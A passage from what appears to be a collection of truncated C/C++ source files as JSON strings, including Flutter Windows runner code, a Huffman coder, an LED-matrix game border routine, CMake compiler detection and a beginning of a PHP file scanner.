SLIME_MOVE_RIGHT_FRAME, SLIME_MOVE_RIGHT_CLIPS);\n    Sprite slimeleft2;\n    slimeleft2.init(slime, SLIME_MOVE_LEFT_FRAME, SLIME_MOVE_LEFT_CLIPS);\n    Sprite slimeright3;\n    slimeright3.init(slime, SLIME_MOVE_RIGHT_FRAME, SLIME_MOVE_RIGHT_CLIPS);\n    Sprite slimeleft3;\n    slimeleft3.init(slime, SLIME_MOVE_LEFT_FRAME, SLIME_MOVE_LEFT_CLIPS);\n    Sprite slimedeath1;\n    slimedeath1.init(",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"../matrix/include/led-matrix.h\"\n\n#include <math.h>\n#include <signal.h>\n#include <stdio.h>\n#include <unistd.h>\n\n#include <exception>\n\n#define BORDER_LEFT 21\n#define BORDER_RIGHT 42\n#define BORDER_TOP 0\n#define BORDER_BOTTOM 42\n#define QUEUE_RIGHT 54\n#define QUEUE_TOP 1\n#define QUEUE_BOTTOM 30\n#define HOLD_LEFT 9\n#define HOLD_TOP 1\n#define HOLD_BOTTOM 8\n\nusing rgb_matrix::Canvas;\nusing rgb_matrix::RGBMatrix;\nusing rgb_matrix::FrameCanvas;\n\nvolatile bool interrupt_received = false;\nstatic void InterruptHandler(int signo) {\n  interrupt_received = true;\n}\n\nvoid drawBorders(RGBMatrix *matrix);\n\nint main(int argc, char *argv[]) {\n\tRGBMatrix::Options matrix_options;\n\trgb_matrix::RuntimeOptions runtime_opt;\n\trgb_matrix::ParseOptionsFromFlags(&argc, &argv,\n                                         &matrix_options, &runtime_opt);\n\t\n\tsignal(SIGTERM, InterruptHandler);\n\tsignal(SIGINT, InterruptHandler);\n\t\n\tRGBMatrix *matrix = RGBMatrix::CreateFromOptions(matrix_options, runtime_opt);\n\tif (matrix == NULL)\n\treturn 1;\n\t\n\tdrawBorders(matrix);\n\t\n\tsleep(10000);\n\n\tmatrix->Clear();\n\tdelete matrix;\n\n\treturn 0;\n}\n\nvoid drawBorders(RGBMatrix *matrix) {\n\tfor (int i = BORDER_TOP; i <= BORDER_BOTTOM; i++) {\n\t\tfor (int j = BORDER_LEFT - 1; j <= BORDER_LEFT; j++) {\n\t\t\tmatrix->SetPixel(j, i, 255, 255, 255);\n\t\t}\n\t\tfor (int j = BORDER_RIGHT; j <= BORDER_RIGHT + 1; j++) {\n\t\t\tmatrix->SetPixel(j, i, 255, 255, 255);\n\t\t}\n\t}\n\tfor (int i = BORDER_LEFT - 1; i <= BORDER_RIGHT + 1; i++) {\n\t\tmatrix->SetPixel(i, BORDER_BOTTOM, 255, 255, 255);\n\t\tmatrix->SetPixel(i, BORDER_BOTTOM + 1, 255, 255, 255);\n\t}\n\t\n\tfor (int i = QUEUE_TOP; i <= QUEUE_BOTTOM; i++) {\n\t\tfor (int j = QUEUE_RIGHT; j <= QUEUE_RIGHT + 1; j++) {\n\t\t\tmatrix->SetPixel(j, i, 255, 255, 255);\n\t\t}\n\t}\n\tfor (int i = BORDER_RIGHT + 1; i <= QUEUE_RIGHT + 1; i++) {\n\t\tmatrix->SetPixel(i, 0, 255, 255, 255);\n\t\tmatrix->SetPixel(i, 1, 255, 255, 255);\n\t\tmatrix->SetPixel(i, QUEUE_BOTTOM, 255, 255, 255);\n\t\tmatrix->SetPixel(i, QUEUE_BOTTOM + 1, 255, 255, 255);\n\t}\n\t\n\tfor (int i = HOLD_TOP; i <= HOLD_BOTTOM; i++) {\n\t\tfor (int j = HOLD_LEFT - 1; j <= HOLD_LEFT; j++) {\n\t\t\tmatrix->SetPixel(j, i, 255, 255, 255);\n\t\t}\n\t}\n\tfor (int i = HOLD_LEFT -1; i <= BORDER_LEFT; i++) {\n\t\tmatrix->SetPixel(i, 0, 255, 255, 255);\n\t\tmatrix->SetPixel(i, 1, 255, 255, 255);\n\t\tmatrix->SetPixel(i, HOLD_BOTTOM, 255, 255, 255);\n\t\tmatrix->SetPixel(i, HOLD_BOTTOM + 1, 255, 255, 255);\n\t}\n}\n",
    "#include \"huffman.h\"\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\n// Fungsi untuk membuat node baru\nNode* buatNode(char karakter, int frekuensi) {\n    Node* node = (Node*)malloc(sizeof(Node));\n    node->karakter = karakter;\n    node->frekuensi = frekuensi;\n    node->code = NULL;\n    node->next = NULL;\n    node->left = NULL;\n    node->right = NULL;\n    return node;\n}\n\n// Fungsi untuk menambah atau memperbarui node dalam linked list\nvoid tambahAtauPerbaruiNode(Node** head, char karakter) {\n    Node* current = *head;\n    Node* prev = NULL;\n\n    // Cari karakter dalam linked list\n    while (current != NULL && current->karakter != karakter) {\n        prev = current;\n        current = current->next;\n    }\n\n    // Jika karakter ditemukan, perbarui frekuensinya\n    if (current != NULL) {\n        current->frekuensi++;\n    } else {\n        // Jika karakter tidak ditemukan, buat node baru\n        Node* newNode = buatNode(karakter, 1);\n        if (prev == NULL) {\n            // Tambah node baru sebagai head jika list kosong\n            *head = newNode;\n        } else {\n            // Tambah node baru di akhir list\n            prev->next = newNode;\n        }\n    }\n}\n\nvoid cetakJudul(char* text, int max_length) {\n    int text_length = strlen(text);\n\n    printf(\"\\n\");\n    printf(\"%c\", 201);\n    for (int i = 0; i < max_length; i++) {\n        printf(\"%c\", 205);\n    }\n    printf(\"%c\\n\", 187);\n    printf(\"%c %s\", 186, text);\n    for (int i = 0; i < max_length - text_length - 2; i++) {\n        printf(\" \");\n    }\n    printf(\" %c\\n\", 186);\n    printf(\"%c\", 200);\n    for (int i = 0; i < max_length; i++) {\n        printf(\"%c\", 205);\n    }\n    printf(\"%c\\n\\n\", 188);\n}\n\n// Fungsi untuk menghitung frekuensi karakter dan menyimpannya dalam linked list\nvoid hitungFrekuensiKarakter(const char* str, Node** head) {\n    int panjang = strlen(str);\n\n    // Menghitung frekuensi setiap karakter\n    for (int i = 0; i < panjang; i++) {\n        tambahAtauPerbaruiNode(head, str[i]);\n    }\n}\n\n// Fungsi untuk mencetak hasil frekuensi dalam format tabel\nvoid cetakFrekuensi(const Node* head) {\n    // 1\n    printf(\"%c\", 201);\n    for (int i = 0; i < 11; i++)\n        printf(\"%c\", 205);\n    const Node* current = head;\n    while (current != NULL) {\n        printf(\"%c\", 203);\n        for (int i = 0; i < 11; i++)\n            printf(\"%c\", 205);\n        current = current->next;\n    }\n    printf(\"%c\\n\", 187);\n\n    // 2\n    printf(\"%c Karakter  \", 186);\n    current = head;\n    while (current != NULL) {\n        printf(\"%c    '%c'    \", 186, current->karakter);\n        current = current->next;\n    }\n    printf(\"%c\\n\", 186);\n\n    // 3\n    printf(\"%c\", 204);\n    for (int i = 0; i < 11; i++)\n        printf(\"%c\", 205);\n    current = head;\n    while (current != NULL) {\n        printf(\"%c\", 206);\n        for (int i = 0; i < 11; i++)\n            printf(\"%c\", 205);\n        current = current->next;\n    }\n    printf(\"%c\\n\", 185);\n\n    // 4\n    printf(\"%c Frekuensi \", 186);\n    current = head;\n    while (current != NULL) {\n        char str[12];\n        snprintf(str, 12, \"%d\", current->frekuensi);\n        int length = strlen(str);\n\n        int padding = (11 - length) / 2;\n        printf(\"%c\", 186);\n        for (int j = 0; j < padding; j++)\n            printf(\" \");\n\n        printf(\"%d\", current->frekuensi);\n\n        for (int j = 0; j < (11 - length - padding); j++)\n            printf(\" \");\n\n        current = current->next;\n    }\n    printf(\"%c\\n\", 186);\n\n    // 5\n    printf(\"%c\", 200);\n    for (int i = 0; i < 11; i++)\n        printf(\"%c\", 205);\n    current = head;\n    while (current != NULL) {\n        printf(\"%c\", 202);\n        for (int i = 0; i < 11; i++)\n            printf(\"%c\", 205);\n        current = current->next;\n    }\n    printf(\"%c\\n\", 188);\n}\n\n// Fungsi untuk mengurutkan linked list berdasarkan frekuensi secara menaik dan karakter\nvoid urutkanFrekuensi(Node** head) {\n    if (*head == NULL) return;\n\n    Node* sorted = NULL;\n\n    Node* current = *head;\n    // selama node bukan null\n    while (current != NULL) {\n        // ambil node selanjutnya\n        Node* next = current->next;\n\n        // jika sorted null || frekuensi sorted lebih besar dari frekuensi current || frekuensi dan karakter sama\n        if (sorted == NULL || sorted->frekuensi > current->frekuensi || (sorted->frekuensi == current->frekuensi && sorted->karakter > current->karakter)) {\n            current->next = sorted;\n            sorted = current;\n        } else {\n            Node* temp = sorted;\n\n            // jika temp next bukan null && (frekuensi temp next lebih kecil dari frekuensi current || frekuensi sama dan karakter temp next lebih kecil dari karakter current\n            while (temp->next != NULL && (temp->next->frekuensi < current->frekuensi || (temp->next->frekuensi == current->frekuensi && temp->next->karakter < current->karakter))) {\n                temp = temp->next;\n            }\n            current->next = temp->next;\n            temp->next = current;\n        }\n        cur",
    "#include \"tripch.h\"\n#include \"WindowsInput.h\"\n\n#include <Tridium/Core/Application.h>\n#include <GLFW/glfw3.h>\n\nnamespace Tridium {\n\n\tInput* Input::s_Instance = new WindowsInput();\n\n\tbool WindowsInput::IsKeyPressedImpl( int keycode )\n\t{\n\t\tauto window = static_cast<GLFWwindow*>( Application::Get().GetWindow().GetNativeWindow() );\n\t\tauto state = glfwGetKey( window, keycode );\n\t\treturn state == GLFW_PRESS || state == GLFW_REPEAT;\n\t}\n\n\tbool WindowsInput::IsMouseButtonPressedImpl( int button )\n\t{\n\t\tauto window = static_cast<GLFWwindow*>( Application::Get().GetWindow().GetNativeWindow() );\n\t\tauto state = glfwGetMouseButton( window, button );\n\t\treturn state == GLFW_PRESS;\n\t}\n\n\tstd::pair<float, float> WindowsInput::GetMousePositionImpl()\n\t{\n\t\tauto window = static_cast<GLFWwindow*>( Application::Get().GetWindow().GetNativeWindow() );\n\t\tdouble xpos, ypos;\n\t\tglfwGetCursorPos( window, &xpos, &ypos );\n\t\treturn { (float)xpos, (float)ypos };\n\t}\n\n\tfloat WindowsInput::GetMouseXImpl()\n\t{\n\t\tauto [x, y] = GetMousePositionImpl();\n\t\treturn x;\n\t}\n\n\tfloat WindowsInput::GetMouseYImpl()\n\t{\n\t\tauto [x, y] = GetMousePositionImpl();\n\t\treturn y;\n\t}\n\n}",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n#if !defined(__has_include)\n/* If the compiler does not have __has_include, pretend the answer is\n   always no.  */\n#  define __has_include(x) 0\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__COMO__)\n# define COMPILER_ID \"Comeau\"\n  /* __COMO_VERSION__ = VRR */\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\n\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\n     except that a few beta releases use the old format with V=2021.  */\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n#  if defined(__INTEL_COMPILER_UPDATE)\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n#  else\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n#  endif\n# else\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\n   /* The third version component from --version is an update index,\n      but no macro is provided for it.  */\n#  define COMPILER_VERSION_PATCH DEC(0)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\n# define COMPILER_ID \"IntelLLVM\"\n#if defined(_MSC_VER)\n# define SIMULATE_ID \"MSVC\"\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_ID \"GNU\"\n#endif\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\n * VVVV is no smaller than the current year when a version is released.\n */\n#if __INTEL_LLVM_COMPILER < 1000000L\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\n#else\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\n#endif\n#if defined(_MSC_VER)\n  /* _MSC_VER = VVRR */\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n#elif defined(__GNUG__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n#endif\n#if defined(__GNUC_MINOR__)\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n#endif\n#if defined(__GNUC_PATCHLEVEL__)\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n#endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ =",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\n#include <fstream>\n#include <vector>\n#include <cstdio>\n#include <string>\n\nstd::vector<std::string> fileList;\nstd::vector<std::string> phpFilter;\nstd::vector<std::string> warningList;\nint returnCode = 0;\n\nvoid createPhpFilter() {\n    std::ifstream conf(\"phpFilter.wwwqr\");\n    if (!conf.is_open()) {\n        std::cout << \"\\n\\nCould not open phpFilter.wwwqr.\\n\\n\";\n        return;\n    }\n    std::string line;\n    while(std::getline(conf, line)) {\n        phpFilter.emplace_back(line);\n    }\n    conf.close();\n}\n\nvoid createFilters() {\n    createPhpFilter();\n}\n\nstd::string exec(const char* cmd) {\n    FILE* pipe = popen(cmd, \"r\");\n    if (!pipe) return \"ERROR\";\n    char buffer[128];\n    std::string result = \"\";\n    while (!feof(pipe)) {\n        if (fgets(buffer, 128, pipe) != NULL)\n            result += buffer;\n    }\n    pclose(pipe);\n    return result;\n}\n\nstd::string getExtentionName(std::string path) {\n    int pos = path.find_last_of('.');\n    if (pos != std::string::npos) {\n        return path.substr(pos + 1);\n    }\n    return \"\";\n}\n\nvoid setFileList() {\n    fileList.clear();\n    std::string tmpStr = exec(\"find ../ -type f\");\n    std::string cache = \"\";\n    for (char c : tmpStr) {\n        if (c == '\\n') {\n            fileList.emplace_back(cache);\n            cache = \"\";\n        }\n        else {\n            cache += c;\n        }\n    }\n}\n\nvoid checkFiles(const std::string &whitelistPath) {\n    for (auto& str : fileList) {\n        std::ifstream file(str);\n        std::string line;\n        if (!file.is_open()) {\n            continue;\n        }\n        //whitelist check\n        std::ifstream whitelist((\"../\" + whitelistPath).c_str());\n\n        if (whitelist.is_open()) {\n            std::string tmpWLine;\n            bool isWhite = false;\n            while (std::getline(whitelist, tmpWLine)) {\n                if (str == tmpWLine) {\n                    isWhite = true;\n                    break;\n                }\n            }\n            whitelist.close();\n            if (isWhite) {\n                continue;\n            }\n        }\n        else {\n            std::cout << \"\\n\\n\" << whitelistPath << \" file not found.\\n\\n\";\n        }\n        //\n        int lineCount = 0;\n        while 